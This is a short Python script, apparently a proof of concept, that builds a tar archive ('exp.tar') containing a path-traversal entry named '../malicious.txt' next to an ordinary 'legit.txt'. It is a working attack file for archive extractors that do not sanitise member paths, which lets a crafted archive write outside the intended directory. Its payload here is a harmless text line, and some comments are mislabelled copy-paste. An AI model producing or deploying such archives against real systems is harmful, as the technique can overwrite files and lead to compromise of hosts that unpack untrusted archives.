import tarfile
import os

def create_malicious_tar():
    # Create a tar file
    tar_file_name = 'exp.tar'
    with tarfile.open(tar_file_name, 'w') as tar_file:
        # Add a file with a malicious path traversal
        malicious_file_path = '../malicious.txt'
        # Create an empty file for demonstration purposes
        with open(malicious_file_path, 'w') as malicious_file:
            malicious_file.write('This is a malicious file.')

        # Add the malicious file to the tar archive
        tar_file.add(malicious_file_path)
        
        # Add a file with a malicious path traversal
        legit_file_path = 'legit.txt'
        # Create an empty file for demonstration purposes
        with open(legit_file_path, 'w') as legit_file:
            legit_file.write('This is a legit file.')

        # Add the malicious file to the tar archive
        tar_file.add(legit_file_path)

        # Cleanup the created malicious file
        #os.remove(malicious_file_path)

create_malicious_tar()